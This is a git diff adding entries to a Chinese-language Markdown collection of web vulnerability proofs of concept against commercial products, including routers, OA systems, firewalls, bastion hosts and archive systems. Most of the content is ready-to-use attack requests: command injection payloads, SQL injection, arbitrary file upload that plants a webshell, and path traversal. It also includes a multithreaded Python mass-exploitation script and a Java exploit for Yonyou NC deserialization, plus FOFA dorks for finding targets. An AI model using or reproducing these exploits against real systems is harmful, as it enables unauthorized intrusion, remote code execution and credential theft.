@@ -1,4 +1,4 @@
-# Web漏洞
+# Web漏洞（历史漏洞，不包含2023的漏洞）
 
 ## 海康威视isecure center 综合安防管理平台存在任意文件上传漏洞
 
@@ -205,5 +205,265 @@ if __name__ == "__main__":
         print("python %s encoded_str" % argv[0])
         print("python %s -d encoded_str" % argv[0])
         print("python %s -e raw_str" % argv[0])
+```
+
+## Sapido多款路由器命令执行漏洞
+
+```
+# 访问以下页面执行命令即可。
+http://xxx.xxx.xxx.xxx:1080/syscmd.htm
+```
+
+##  紫光电子档案管理系统 任意文件上传漏洞
+
+```
+# shell地址：/uploads/company1/fonds1/cms/20230914/响应包中回显的文件名。
+POST /System/Cms/upload.html?token= HTTP/1.1
+Host: ip:port
+User-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.93 Safari/537.36
+Connection: close
+Content-Length: 544
+Accept: application/json, text/javascript, */*; q=0.01
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundary3enKbCUwg60aGZcr
+
+------WebKitFormBoundary3enKbCUwg60aGZcr
+Content-Disposition: form-data; name="userID"
+
+admin
+------WebKitFormBoundary3enKbCUwg60aGZcr
+Content-Disposition: form-data; name="fondsid"
+
+1
+------WebKitFormBoundary3enKbCUwg60aGZcr
+Content-Disposition: form-data; name="comid"
+
+1
+------WebKitFormBoundary3enKbCUwg60aGZcr
+Content-Disposition: form-data; name="token"
+
+1
+------WebKitFormBoundary3enKbCUwg60aGZcr
+Content-Disposition: form-data; name="files[]"; filename="11.txt"
+
+12345ewq
+------WebKitFormBoundary3enKbCUwg60aGZcr--
+```
+
+## 天融信上网行为管理RCE
+
+```
+GET /view/IPV6/naborTable/static_convert.php?blocks[0]=||%20echo%20'123'%20>>%20/var/www/html/1.txt%0A HTTP/1.1
+Host: 127.0.0.1:8088
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
+Accept: */*
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 1567
+
+
+# 然后访问/1.txt
+```
+
+## 锐捷EG易网关 管理员账号密码泄露
+
+```
+POST /login.php
+
+username=admin&password=admin?show+webmaster+user
+```
+
+## 泛微OA E-Cology getSqlData SQL注入漏洞
+
+```
+/Api/portal/elementEcodeAddon/getSqlData?sql=select%20@@version
+```
+
+## 用友 NC FileReceiveServlet 反序列化RCE漏洞
+
+```
+# 文件上传
+
+import requests
+import threadpool
+import urllib3
+import sys
+import argparse
+
+urllib3.disable_warnings()
+proxies = {'http': 'http://localhost:8080', 'https': 'http://localhost:8080'}
+header = {
+    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",
+    "Content-Type": "application/x-www-form-urlencoded",
+    "Referer": "https://google.com",
+}
+
+def multithreading(funcname, filename="url.txt", pools=5):
+    works = []
+    with open(filename, "r") as f:
+        for i in f:
+            func_params = [i.rstrip("\n")]
+            works.append((func_params, None))
+    pool = threadpool.ThreadPool(pools)
+    reqs = threadpool.makeRequests(funcname, works)
+    [pool.putRequest(req) for req in reqs]
+    pool.wait()
+
+def wirte_targets(vurl, filename):
+    with open(filename, "a+") as f:
+        f.write(vurl + "\n")
+        return vurl
+    
+def exp(u):
+    uploadHeader = {
+        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",
+        "Content-Type": "multipart/form-data;",
+        "Referer": "https://google.com"
+    }
+    uploadData = "\xac\xed\x00\x05\x73\x72\x00\x11\x6a\x61\x76\x61\x2e\x75\x74\x69\x6c\x2e\x48\x61\x73\x68\x4d\x61\x70\x05\x07\xda\xc1\xc3\x16\x60\xd1\x03\x00\x02\x46\x00\x0a\x6c\x6f\x61\x64\x46\x61\x63\x74\x6f\x72\x49\x00\x09\x74\x68\x72\x65\x73\x68\x6f\x6c\x64\x78\x70\x3f\x40\x00\x00\x00\x00\x00\x0c\x77\x08\x00\x00\x00\x10\x00\x00\x00\x02\x74\x00\x09\x46\x49\x4c\x45\x5f\x4e\x41\x4d\x45\x74\x00\x09\x74\x30\x30\x6c\x73\x2e\x6a\x73\x70\x74\x00\x10\x54\x41\x52\x47\x45\x54\x5f\x46\x49\x4c\x45\x5f\x50\x41\x54\x48\x74\x00\x10\x2e\x2f\x77\x65\x62\x61\x70\x70\x73\x2f\x6e\x63\x5f\x77\x65\x62\x78"
+    shellFlag="t0test0ls"
+    uploadData+=shellFlag
+    try:
+        req1 = requests.post(u + "/servlet/FileReceiveServlet", headers=uploadHeader, verify=False, data=uploadData, timeout=25)
+        if req1.status_code == 200 :
+            req3=requests.get(u+"/t00ls.jsp",headers=header, verify=False, timeout=25)
+
+            if  req3.text.index(shellFlag)>=0:
+                printFlag = "[Getshell]" + u+"/t00ls.jsp"  + "\n"
+                print (printFlag)
+                wirte_targets(printFlag, "vuln.txt")
+    except :
+        pass
+    #print(printFlag, end="")
+
+
+if __name__ == "__main__":
+    if (len(sys.argv)) < 2:
+        print('useage : python' +str(sys.argv[0]) + ' -h')
+    else:
+        parser =argparse.ArgumentParser()
+        parser.description ='YONYOU UC 6.5 FILE UPLOAD!'
+        parser.add_argument('-u',help="url -> example http://127.0.0.1",type=str,dest='check_url')
+        parser.add_argument('-r',help="url list to file",type=str,dest='check_file')
+        args =parser.parse_args()
+        if args.check_url:
+            exp(args.check_url)
+        
+        if(args.check_file):
+            multithreading(exp, args.check_file, 8)
+            
+# java exp
+import java.io.*;
+import java.util.HashMap;
+import java.util.Map;
+
+public class App {
+    public static void main(String[] args) throws Exception {
+        String url="http://192.168.40.222";
+        Map<String, Object> metaInfo=new HashMap<String, Object>();
+        metaInfo.put("TARGET_FILE_PATH","webapps/nc_web");
+        metaInfo.put("FILE_NAME","cmd.jsp");
+        ByteArrayOutputStream baos=new ByteArrayOutputStream();
+        ObjectOutputStream oos=new ObjectOutputStream(baos);
+        oos.writeObject(metaInfo);
+        InputStream in=App.class.getResourceAsStream("cmd.jsp");
+        byte[] buf=new byte[1024];
+        int len=0;
+        while ((len=in.read(buf))!=-1){
+            baos.write(buf,0,len);
+        }
+        HttpClient.post(url+"/servlet/FileReceiveServlet",baos.toByteArray());
+        HttpResult result=HttpClient.get(url+"/cmd.jsp?cmd=echo+aaaaaa");
+        if(result.getData().contains("aaaaaa")){
+            System.out.println("shell路径:"+url+"/cmd.jsp?cmd=whoami");
+        }else{
+            System.out.println("上传shell失败或者漏洞不存在");
+        }
+    }
+}
+```
+
+## 用友NC 控制台密码绕过
+
+```
+/uapws/index.jsp
+
+# nuclei poc
+
+id: yonyou_console_uapws
+
+info:
+  name: yonyou_console_uapws
+  author: bjx
+  severity: high
+  tags: yonyou,yonyouoa,oa,bjxsec
+  description: fofa   app="用友-UFIDA-NC"
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/uapws/"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "basictable"
+          - "<title>WS-Console</title>"
+        part: body
+        condition: and
+
+      - type: status
+        status:
+          - 200
+```
+
+## H3C SecParh堡垒机 data_provider.php 远程命令执行
+
+```
+# 获取用户登录cookie
+/audit/gui_detail_view.php?token=1&id=%5C&uid=%2Cchr(97))%20or%201:%20print%20chr(121)%2bchr(101)%2bchr(115)%0d%0a%23&login=admin
+# 执行命令
+/audit/data_provider.php?ds_y=2019&ds_m=04&ds_d=02&ds_hour=09&ds_min40&server_cond=&service=$(id)&identity_cond=&query_type=all&format=json&browse=true
+```
+
+## 锐捷RG-UAC统一上网行为管理与审计系统管理员密码泄露
+
+```
+fofa:title="RG-UAC登录页面" && body="admin"
+打开目标网站
+不用进行任何操作，直接查看源码然后Ctrl+F搜索字符串"admin"
+```
+
+## 网康防火墙远程命令执行漏洞
+
+```
+# 执行结果：http://ip:port/checkTest.txt
+POST /directdata/direct/router HTTP/1.1
+Host: ip:port
+Cookie: PHPSESSID=43h4kc2ln41b2oi2ipj485p7h3; ys-active_page=s%3A
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Dnt: 1
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 205
+Connection: close
+
+{"action":"SSLVPN_Resource","method":"deleteImage","data":[{"data":["/var/www/html/d.txt;echo 'This website has a vulnerability!!!' >/var/www/html/checkTest.txt"]}],"type":"rpc","tid":17,"f8839p7rqtj":"="}
+```
+
+## 好视通视频会议系统(fastmeeting) toDownload.do接口存在任意文件读取漏洞
+
+```
+GET /register/toDownload.do?fileName=../../../../../../../../../../../../../../windows/win.ini HTTP/1.1
+Host: 127.0.0.1
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
+Accept: */*
+Connection: Keep-Alive
 ```
 
